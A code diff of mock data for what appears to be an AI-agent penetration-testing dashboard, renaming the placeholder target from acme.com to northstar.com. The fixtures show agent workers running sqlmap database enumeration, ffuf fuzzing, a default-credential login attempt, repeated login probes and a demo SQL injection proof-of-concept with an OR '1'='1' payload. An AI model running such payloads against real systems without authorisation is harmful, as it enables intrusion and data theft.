     },
     {
       seq: 3,
@@ -3610,7 +3610,7 @@ export const conversationMessages: Record<number, Activity[]> = {
       kind: "tool_use",
       tool: "bash",
       tool_use_id: "c11",
-      summary: "curl -s https://admin.acme.com/login | grep -Eo 'element-ui|captcha|csrf'",
+      summary: "curl -s https://admin.northstar.com/login | grep -Eo 'element-ui|captcha|csrf'",
     },
     {
       seq: 4,
@@ -3630,7 +3630,7 @@ export const conversationMessages: Record<number, Activity[]> = {
       tool: "bash",
       tool_use_id: "c12",
       summary:
-        "for i in 1 2 3 4 5; do curl -s -o /dev/null -w '%{http_code}\\n' -d 'username=x&password=y' https://admin.acme.com/login; done",
+        "for i in 1 2 3 4 5; do curl -s -o /dev/null -w '%{http_code}\\n' -d 'username=x&password=y' https://admin.northstar.com/login; done",
     },
     {
       seq: 6,
@@ -3666,7 +3666,7 @@ export const conversationMessages: Record<number, Activity[]> = {
       worker: "user",
       ts: T("2026-07-24T16:00:00Z"),
       kind: "user",
-      summary: "帮我梳理下 api.acme.com 的越权面。",
+      summary: "帮我梳理下 api.northstar.com 的越权面。",
     },
     {
       seq: 2,
@@ -3682,7 +3682,7 @@ export const conversationMessages: Record<number, Activity[]> = {
       kind: "tool_use",
       tool: "bash",
       tool_use_id: "c21",
-      summary: "curl -s https://api.acme.com/v1/users/me -H 'Authorization: Bearer <self>' | jq '{id,role}'",
+      summary: "curl -s https://api.northstar.com/v1/users/me -H 'Authorization: Bearer <self>' | jq '{id,role}'",
     },
     {
       seq: 4,
@@ -3824,79 +3824,79 @@ export const coverage = {
 // ── 资产覆盖图（/tasks/{id}/coverage-graph）──
 export const coverageGraph = {
   nodes: [
-    { key: "c:1", kind: "company", label: "Acme Corp", tested: false, in_scope: false, company_id: 1 },
+    { key: "c:1", kind: "company", label: "Northstar Corp", tested: false, in_scope: false, company_id: 1 },
     {
       key: "a:1",
       kind: "root_domain",
-      label: "acme.com",
+      label: "northstar.com",
       tested: false,
       in_scope: false,
       asset_id: 1,
-      domain: "acme.com",
+      domain: "northstar.com",
       company_id: 1,
     },
     {
       key: "a:2",
       kind: "subdomain",
-      label: "www.acme.com",
+      label: "www.northstar.com",
       tested: true,
       in_scope: true,
       asset_id: 2,
-      domain: "www.acme.com",
-      root_domain: "acme.com",
+      domain: "www.northstar.com",
+      root_domain: "northstar.com",
     },
     {
       key: "a:3",
       kind: "subdomain",
-      label: "api.acme.com",
+      label: "api.northstar.com",
       tested: true,
       in_scope: true,
       asset_id: 3,
-      domain: "api.acme.com",
-      root_domain: "acme.com",
+      domain: "api.northstar.com",
+      root_domain: "northstar.com",
     },
     {
       key: "a:4",
       kind: "subdomain",
-      label: "admin.acme.com",
+      label: "admin.northstar.com",
       tested: false,
       in_scope: true,
       asset_id: 4,
-      domain: "admin.acme.com",
-      root_domain: "acme.com",
+      domain: "admin.northstar.com",
+      root_domain: "northstar.com",
     },
     {
       key: "a:5",
       kind: "service",
-      label: "www.acme.com",
+      label: "www.northstar.com",
       tested: true,
       in_scope: true,
       asset_id: 5,
-      domain: "www.acme.com",
-      url: "https://www.acme.com",
+      domain: "www.northstar.com",
+      url: "https://www.northstar.com",
       port: 443,
-      page_title: "Acme 首页",
+      page_title: "Northstar 首页",
       status_code: 200,
     },
     {
       key: "a:6",
       kind: "endpoint",
-      label: "https://www.acme.com/search",
+      label: "https://www.northstar.com/search",
       tested: true,
       in_scope: true,
       asset_id: 6,
-      url: "https://www.acme.com/search?q=",
-      domain: "www.acme.com",
+      url: "https://www.northstar.com/search?q=",
+      domain: "www.northstar.com",
     },
     {
       key: "a:7",
       kind: "service",
-      label: "api.acme.com",
+      label: "api.northstar.com",
       tested: true,
       in_scope: true,
       asset_id: 7,
-      domain: "api.acme.com",
-      url: "https://api.acme.com",
+      domain: "api.northstar.com",
+      url: "https://api.northstar.com",
       port: 443,
       page_title: "API Gateway",
       status_code: 401,
@@ -3904,22 +3904,22 @@ export const coverageGraph = {
     {
       key: "a:8",
       kind: "endpoint",
-      label: "https://api.acme.com/v1/orders",
+      label: "https://api.northstar.com/v1/orders",
       tested: false,
       in_scope: true,
       asset_id: 8,
-      url: "https://api.acme.com/v1/orders?id=",
-      domain: "api.acme.com",
+      url: "https://api.northstar.com/v1/orders?id=",
+      domain: "api.northstar.com",
     },
     {
       key: "a:9",
       kind: "service",
-      label: "admin.acme.com",
+      label: "admin.northstar.com",
       tested: false,
       in_scope: true,
       asset_id: 9,
-      domain: "admin.acme.com",
-      url: "https://admin.acme.com",
+      domain: "admin.northstar.com",
+      url: "https://admin.northstar.com",
       port: 443,
       page_title: "后台登录",
       status_code: 200,
@@ -3972,11 +3972,11 @@ export function nodeAssetsFor(nodeId: string): FindingAsset[] {
 export function assetRefsFor(_assetId: number) {
   return {
     intents: [
-      { id: 12, kind: "intent", state: "done", summary: "对 www.acme.com 搜索接口做 SQL 注入探测" },
-      { id: 18, kind: "intent", state: "running", summary: "枚举 api.acme.com 的对象越权 (IDOR)" },
+      { id: 12, kind: "intent", state: "done", summary: "对 www.northstar.com 搜索接口做 SQL 注入探测" },
+      { id: 18, kind: "intent", state: "running", summary: "枚举 api.northstar.com 的对象越权 (IDOR)" },
     ],
     facts: [{ id: 34, kind: "fact", state: "confirmed", summary: "search?q= 参数可注入，报错回显 MySQL 语法错误" }],
-    findings: [{ id: 41, kind: "finding", state: "confirmed", summary: "[高] SQL 注入 www.acme.com/search?q=" }],
+    findings: [{ id: 41, kind: "finding", state: "confirmed", summary: "[高] SQL 注入 www.northstar.com/search?q=" }],
   };
 }
 
@@ -3994,7 +3994,7 @@ const WS_TREE: Record<string, { name: string; dir: boolean; size: number; conten
   ],
   "t-001": [
     { name: "i12", dir: true, size: 0 },
-    { name: "recon.txt", dir: false, size: 64, content: "acme.com\nwww.acme.com\napi.acme.com\nadmin.acme.com\n" },
+    { name: "recon.txt", dir: false, size: 64, content: "northstar.com\nwww.northstar.com\napi.northstar.com\nadmin.northstar.com\n" },
   ],
   "t-001/i12": [
     {
@@ -4002,7 +4002,7 @@ const WS_TREE: Record<string, { name: string; dir: boolean; size: number; conten
       dir: false,
       size: 220,
       content:
-        "#!/usr/bin/env python3\n# (demo) SQLi PoC — www.acme.com/search?q=\nimport requests\n\nr = requests.get('https://www.acme.com/search', params={'q': \"1' OR '1'='1\"})\nprint(r.status_code, len(r.text))\n",
+        "#!/usr/bin/env python3\n# (demo) SQLi PoC — www.northstar.com/search?q=\nimport requests\n\nr = requests.get('https://www.northstar.com/search', params={'q': \"1' OR '1'='1\"})\nprint(r.status_code, len(r.text))\n",
     },
     {
       name: "response.html",
@@ -4050,7 +4050,7 @@ export const commandRecords = [
     exploration_id: 1,
     worker: "worker-1",
     tool: "bash",
-    command: JSON.stringify({ command: "curl -s 'https://www.acme.com/search?q=test'" }),
+    command: JSON.stringify({ command: "curl -s 'https://www.northstar.com/search?q=test'" }),
     output: "HTTP/1.1 200 OK\nContent-Length: 12034\n<html>… 搜索结果页 …</html>",
     is_error: false,
     created_at: T("2026-08-09T02:10:00Z"),
@@ -4060,8 +4060,8 @@ export const commandRecords = [
     exploration_id: 1,
     worker: "worker-1",
     tool: "bash",
-    command: JSON.stringify({ command: "sqlmap -u 'https://www.acme.com/search?q=1' --batch --dbs" }),
-    output: "[*] available databases [2]:\n[*] acme_prod\n[*] information_schema\nback-end DBMS: MySQL >= 5.7",
+    command: JSON.stringify({ command: "sqlmap -u 'https://www.northstar.com/search?q=1' --batch --dbs" }),
+    output: "[*] available databases [2]:\n[*] northstar_prod\n[*] information_schema\nback-end DBMS: MySQL >= 5.7",
     is_error: false,
     created_at: T("2026-08-09T02:12:30Z"),
   },
@@ -4070,7 +4070,7 @@ export const commandRecords = [
     exploration_id: 1,
     worker: "worker-2",
     tool: "bash",
-    command: JSON.stringify({ command: "ffuf -u https://api.acme.com/FUZZ -w common.txt -mc 200,401,403" }),
+    command: JSON.stringify({ command: "ffuf -u https://api.northstar.com/FUZZ -w common.txt -mc 200,401,403" }),
     output: "v1       [Status: 200]\nhealth   [Status: 200]\norders   [Status: 401]\nadmin    [Status: 403]",
     is_error: false,
     created_at: T("2026-08-09T02:15:00Z"),
@@ -4090,7 +4090,7 @@ export const commandRecords = [
     exploration_id: 1,
     worker: "worker-1",
     tool: "bash",
-    command: JSON.stringify({ command: "curl -s https://admin.acme.com/login --data 'user=admin&pass=admin123'" }),
+    command: JSON.stringify({ command: "curl -s https://admin.northstar.com/login --data 'user=admin&pass=admin123'" }),
     output: "curl: (28) Operation timed out after 10000 ms",
     is_error: true,
     created_at: T("2026-08-09T02:20:00Z"),
@@ -4186,7 +4186,7 @@ export function llmRecordDetail(id: number, records = llmRecords) {
         stop_reason: item.status === "error" ? "error" : "tool_use",
         content: [
           { type: "text", text: "对 search?q= 做注入探测，先用报错型 payload 验证。" },
-          { type: "tool_use", name: "bash", input: { command: "curl -s 'https://www.acme.com/search?q=1%27'" } },
+          { type: "tool_use", name: "bash", input: { command: "curl -s 'https://www.northstar.com/search?q=1%27'" } },
         ],
         usage: { input_tokens: item.input_tokens, output_tokens: item.output_tokens },
       },
@@ -4222,7 +4222,7 @@ export function llmRecordDetail(id: number, records = llmRecords) {
       `data: {"type":"content_block_start","index":1,"content_block":{"type":"tool_use","id":"toolu_01mock","name":"bash"}}`,
       ``,
       `event: content_block_delta`,
-      `data: {"type":"content_block_delta","index":1,"delta":{"type":"input_json_delta","partial_json":"{\\"command\\":\\"curl -s 'https://www.acme.com/search?q=1%27'\\"}"}}`,
+      `data: {"type":"content_block_delta","index":1,"delta":{"type":"input_json_delta","partial_json":"{\\"command\\":\\"curl -s 'https://www.northstar.com/search?q=1%27'\\"}"}}`,
       ``,
       `event: message_delta`,
       `data: {"type":"message_delta","delta":{"stop_reason":"tool_use"},"usage":{"output_tokens":${item.output_tokens}}}`,
